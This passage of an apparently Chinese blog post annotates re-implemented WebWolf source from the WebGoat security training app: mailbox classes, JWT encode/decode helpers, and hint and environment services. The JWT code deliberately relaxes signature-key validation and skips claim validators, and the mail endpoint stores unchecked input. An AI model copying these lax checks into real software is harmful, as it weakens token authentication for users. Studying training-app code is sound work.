class="string">&quot;http://&quot;</span>+server+<span class="string">&quot;:&quot;</span>+port);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="mailbox"><a href="#mailbox" class="headerlink" title="mailbox"></a>mailbox</h2><h3 id="Email"><a href="#Email" class="headerlink" title="Email"></a>Email</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.mailbox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonIgnore;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.time.format.DateTimeFormatter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="comment">//作为数据类</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="comment">//可以链式调用的方式给赋值</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//生成有参构造</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="comment">//指数据映射到数据库中</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="comment">//生成无参构造</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Email</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy =  GenerationType.IDENTITY)</span></span><br><span class="line"><span class="comment">// 主键自增</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="meta">@JsonIgnore</span></span><br><span class="line"><span class="comment">//    在json时进行忽略</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">LocalDateTime</span> <span class="variable">time</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line"><span class="comment">//    返回当时时区的时间</span></span><br><span class="line">    <span class="meta">@Column(length = 1024)</span></span><br><span class="line"><span class="comment">//    对string类型设置最大长度</span></span><br><span class="line">    <span class="keyword">private</span> String contents;</span><br><span class="line">    <span class="keyword">private</span> String sender;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String recipient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSummary</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;-&quot;</span> + <span class="built_in">this</span>.contents.substring(<span class="number">0</span>,Math.min(<span class="number">50</span>,contents.length()));</span><br><span class="line"><span class="comment">//        先取contents的长度与50之中的最小值 接着进行截取</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> LocalDateTime <span class="title function_">getTimestamp</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> time;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTime</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> DateTimeFormatter.ofPattern(<span class="string">&quot;h:mm a&quot;</span>).format(time);</span><br><span class="line"><span class="comment">//        进行时间格式化</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getShortSender</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sender.substring(<span class="number">0</span>,sender.indexOf(<span class="string">&quot;@&quot;</span>));</span><br><span class="line"><span class="comment">//        进行截取</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MailboxController"><a href="#MailboxController" class="headerlink" title="MailboxController"></a>MailboxController</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.mailbox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">//@RestController 是@controller和@ResponseBody 的结合</span></span><br><span class="line"><span class="comment">//@Controller 将当前修饰的类注入到springboot ioc容器,使得从该类所在的项目跑起来的过程中,这个类就被实例化</span></span><br><span class="line"><span class="comment">//@ResponseBody 它的作用简短的说就是指该类中的api即可返回的数据 不管对应方法返回map或者其他的object,它会以json字符串的形式返回给客户端</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MailboxController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MailboxRepository mailboxRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/mail&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">mail</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">user</span> <span class="operator">=</span> (UserDetails) SecurityContextHolder.getContext().getAuthentication().getPrincipal();</span><br><span class="line"><span class="comment">//        获取当前用户名称</span></span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        List&lt;Email&gt; emails = mailboxRepository.findByRecipientOrderByTimeDesc(user.getUsername());</span><br><span class="line">        <span class="keyword">if</span> (emails != <span class="literal">null</span> &amp;&amp; !emails.isEmpty())&#123;</span><br><span class="line">            modelAndView.addObject(<span class="string">&quot;total&quot;</span>,emails.size());</span><br><span class="line">            modelAndView.addObject(<span class="string">&quot;emails&quot;</span>,emails);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;mailbox&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/mail&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; sendEmail(<span class="meta">@RequestBody</span> Email email)&#123;</span><br><span class="line"><span class="comment">//获取请求体</span></span><br><span class="line">        mailboxRepository.save(email);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.CREATED).build();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MailboxRepository"><a href="#MailboxRepository" class="headerlink" title="MailboxRepository"></a>MailboxRepository</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.mailbox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MailboxRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;Email,String &gt; &#123;</span><br><span class="line">    List&lt;Email&gt; <span class="title function_">findByRecipientOrderByTimeDesc</span><span class="params">(String recipient)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><h3 id="JWTController"><a href="#JWTController" class="headerlink" title="JWTController"></a>JWTController</h3><p>这里进行了修改,不然会造成jwt功能的无法正常使用.注意这里与原版的差异</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822202924467.png" alt="image-20220822202924467"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.owasp.webgoat.webwolf.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.util.MultiValueMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_FORM_URLENCODED_VALUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/jwt&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">jwt</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;jwt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/WebWolf/jwt/decode&quot;, consumes = APPLICATION_FORM_URLENCODED_VALUE, produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="keyword">public</span> JWTToken <span class="title function_">decode</span><span class="params">(<span class="meta">@RequestBody</span> MultiValueMap&lt;String, String&gt; formData)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">jwt</span> <span class="operator">=</span> formData.getFirst(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">secretKey</span> <span class="operator">=</span> formData.getFirst(<span class="string">&quot;secretKey&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> JWTToken.decode(jwt, secretKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/WebWolf/jwt/encode&quot;, consumes = APPLICATION_FORM_URLENCODED_VALUE, produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="keyword">public</span> JWTToken <span class="title function_">encode</span><span class="params">(<span class="meta">@RequestBody</span> MultiValueMap&lt;String, String&gt; formData)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">header</span> <span class="operator">=</span> formData.getFirst(<span class="string">&quot;header&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">payload</span> <span class="operator">=</span> formData.getFirst(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">secretKey</span> <span class="operator">=</span> formData.getFirst(<span class="string">&quot;secretKey&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> JWTToken.encode(header, payload, secretKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JWTToken"><a href="#JWTToken" class="headerlink" title="JWTToken"></a>JWTToken</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> lombok.*;</span><br><span class="line"><span class="keyword">import</span> org.jose4j.jws.JsonWebSignature;</span><br><span class="line"><span class="keyword">import</span> org.jose4j.jwt.consumer.InvalidJwtException;</span><br><span class="line"><span class="keyword">import</span> org.jose4j.jwt.consumer.JwtConsumer;</span><br><span class="line"><span class="keyword">import</span> org.jose4j.jwt.consumer.JwtConsumerBuilder;</span><br><span class="line"><span class="keyword">import</span> org.jose4j.jwx.CompactSerializer;</span><br><span class="line"><span class="keyword">import</span> org.jose4j.keys.HmacKey;</span><br><span class="line"><span class="keyword">import</span> org.jose4j.lang.JoseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.nio.charset.StandardCharsets.UTF_8;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.util.Base64Utils.decodeFromUrlSafeString;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.util.StringUtils.hasText;</span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="comment">//生成无参构造</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//生成全参构造</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="comment">//生成getter方法</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="comment">//生成setter方法</span></span><br><span class="line"><span class="meta">@Builder(toBuilder = true)</span></span><br><span class="line"><span class="comment">//可连续初始化对象  可以修改这个属性的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTToken</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretKey;</span><br><span class="line">    <span class="keyword">private</span> String header;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> validHeader;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> validPayload;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> validToken;</span><br><span class="line">    <span class="keyword">private</span> String payload;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">signatureValid</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JWTToken <span class="title function_">decode</span><span class="params">(String jwt, String secretKey)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">token</span> <span class="operator">=</span> parseToken(jwt.trim().replace(System.getProperty(<span class="string">&quot;line.separator&quot;</span>), <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="comment">//        先去除字符串两端空格 这里是获取系统换行符接着将jwt中的换行符替换为空</span></span><br><span class="line">        <span class="keyword">return</span> token.toBuilder().signatureValid(validateSignature(secretKey, jwt)).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title function_">parse</span><span class="params">(String header)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> reader.readValue(header, TreeMap.class);</span><br><span class="line"><span class="comment">//            这里进行反序列化出了一个treemap对象</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> Map.of();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">write</span><span class="params">(String originalValue, Map&lt;String, Object&gt; data)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writerWithDefaultPrettyPrinter();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (data.isEmpty()) &#123;</span><br><span class="line"><span class="comment">//                如果data是空的</span></span><br><span class="line">                <span class="keyword">return</span> originalValue;</span><br><span class="line"><span class="comment">//                就返回原先的字符串</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> writer.writeValueAsString(data);</span><br><span class="line"><span class="comment">//            将传入的对象序列化成json格式</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> originalValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JWTToken  <span class="title function_">encode</span><span class="params">(String header, String payloadAsString, String secretKey)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">headers</span> <span class="operator">=</span> parse(header);</span><br><span class="line">        <span class="type">var</span> <span class="variable">payload</span> <span class="operator">=</span> parse(payloadAsString);</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">builder</span> <span class="operator">=</span> JWTToken.builder()</span><br><span class="line">                .header(write(header, headers))</span><br><span class="line">                .payload(write(payloadAsString, payload))</span><br><span class="line">                .validHeader(!hasText(header) || !headers.isEmpty())</span><br><span class="line">                .validToken(<span class="literal">true</span>)</span><br><span class="line">                .validPayload(!hasText(payloadAsString) || !payload.isEmpty());</span><br><span class="line"></span><br><span class="line">        <span class="type">JsonWebSignature</span> <span class="variable">jws</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonWebSignature</span>();</span><br><span class="line">        jws.setPayload(payloadAsString);</span><br><span class="line">        headers.forEach((k, v) -&gt; jws.setHeader(k, v));</span><br><span class="line">        <span class="keyword">if</span> (!headers.isEmpty()) &#123; <span class="comment">//otherwise e30 meaning &#123;&#125; will be shown as header</span></span><br><span class="line">            builder.encoded(CompactSerializer.serialize(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;jws.getHeaders().getEncodedHeader(), jws.getEncodedPayload()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Only sign when valid header and payload</span></span><br><span class="line">        <span class="keyword">if</span> (!headers.isEmpty() &amp;&amp; !payload.isEmpty() &amp;&amp; hasText(secretKey)) &#123;</span><br><span class="line">            jws.setDoKeyValidation(<span class="literal">false</span>);</span><br><span class="line">            jws.setKey(<span class="keyword">new</span> <span class="title class_">HmacKey</span>(secretKey.getBytes(UTF_8)));</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                builder.encoded(jws.getCompactSerialization());</span><br><span class="line">                builder.signatureValid(<span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (JoseException e) &#123;</span><br><span class="line">                <span class="comment">//Do nothing</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> builder.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JWTToken <span class="title function_">parseToken</span><span class="params">(String jwt)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">var</span> <span class="variable">token</span> <span class="operator">=</span> jwt.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="comment">//        按.分割jwt</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">builder</span> <span class="operator">=</span> JWTToken.builder().encoded(jwt);</span><br><span class="line"><span class="comment">//        给encoded赋值为jwt</span></span><br><span class="line">        <span class="keyword">if</span> (token.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">header</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(decodeFromUrlSafeString(token[<span class="number">0</span>]), UTF_8);</span><br><span class="line"><span class="comment">//            先进行base64解码返回一个数组 接着转换成utf-8的形式</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">payloadAsString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(decodeFromUrlSafeString(token[<span class="number">1</span>]), UTF_8);</span><br><span class="line">            <span class="type">var</span> <span class="variable">headers</span> <span class="operator">=</span> parse(header);</span><br><span class="line">            <span class="type">var</span> <span class="variable">payload</span> <span class="operator">=</span> parse(payloadAsString);</span><br><span class="line">            builder.header(write(header, headers));</span><br><span class="line">            builder.payload(write(payloadAsString, payload));</span><br><span class="line">            builder.validHeader(!headers.isEmpty());</span><br><span class="line"></span><br><span class="line">            builder.validPayload(!payload.isEmpty());</span><br><span class="line">            builder.validToken(!headers.isEmpty() &amp;&amp; !payload.isEmpty());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            builder.validToken(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> builder.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">validateSignature</span><span class="params">(String secretKey, String jwt)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hasText(secretKey)) &#123;</span><br><span class="line">            <span class="type">JwtConsumer</span> <span class="variable">jwtConsumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JwtConsumerBuilder</span>()</span><br><span class="line">                    .setSkipAllValidators()</span><br><span class="line">                    .setVerificationKey(<span class="keyword">new</span> <span class="title class_">HmacKey</span>(secretKey.getBytes(UTF_8)))</span><br><span class="line">                    <span class="comment">//                    设置密钥</span></span><br><span class="line">                    .setRelaxVerificationKeyValidation()</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                jwtConsumer.processToClaims(jwt);</span><br><span class="line">                <span class="comment">//                这里是用自定义的密钥去验证jwt</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvalidJwtException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h2><p>webwolf静态资源 了解一下 thymeleaf 语法</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220723084922401.png" alt="image-20220723084922401"></p>
<p>注意这里的静态资源包里面的properties文件其实是html文件中会取出来的变量</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220723093406862.png" alt="image-20220723093406862"></p>
<h1 id="container-4"><a href="#container-4" class="headerlink" title="container"></a>container</h1><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><h3 id="EnvironmentService"><a href="#EnvironmentService" class="headerlink" title="EnvironmentService"></a>EnvironmentService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController(&quot;/environment&quot;)</span></span><br><span class="line"><span class="comment">//@RestController 是@Controller和@ResponseBody的结合</span></span><br><span class="line"><span class="comment">//@Controller 将当前修饰的类注入到springboot ioc容器是的从该类所在的项目pao起来的过程中.这个类就被实例化</span></span><br><span class="line"><span class="comment">//@ResponseBody 它的作用简短的说就是该类中的api即可返回的数据不管对应方法返回map或者其他的object,他会以json字符串的形式返回给客户端</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="comment">//所有参数的构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnvironmentService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ApplicationContext context;</span><br><span class="line"><span class="comment">//    用于访问程序资源</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/server-directory&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">homeDirectory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> context.getEnvironment().getProperty(<span class="string">&quot;webgoat.server.directory&quot;</span>);</span><br><span class="line"><span class="comment">//        读取配置文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HintService"><a href="#HintService" class="headerlink" title="HintService"></a>HintService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Assignment;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Hint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.HibernateIterator;</span><br><span class="line"><span class="keyword">import</span> org.jcodings.util.Hash;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HintService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">URL_HINTS_MVC</span> <span class="operator">=</span> <span class="string">&quot;/service/hint.mvc&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HintService</span><span class="params">(WebSession webSession)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.webSession = webSession;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(path = URL_HINTS_MVC,produces = &quot;application/json&quot;)</span></span><br><span class="line"><span class="comment">//    返回json数据</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Hint&gt; <span class="title function_">getHints</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Lesson</span> <span class="variable">l</span> <span class="operator">=</span> webSession.getCurrentLesson();</span><br><span class="line">        <span class="keyword">return</span> createAssignmentHints(l);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Hint&gt; <span class="title function_">createAssignmentHints</span><span class="params">(Lesson l )</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l!= <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> l.getAssignments().stream()</span><br><span class="line">                    .map(<span class="built_in">this</span>::createHint)</span><br><span class="line">                    .flatMap(Collection::stream)</span><br><span class="line">                    .toList();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> List.of();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Hint&gt; <span class="title function_">createHint</span><span class="params">(Assignment a)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.getHints().stream().map(h -&gt; <span class="keyword">new</span> <span class="title class_">Hint</span>(h,a.getPath())).toList();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

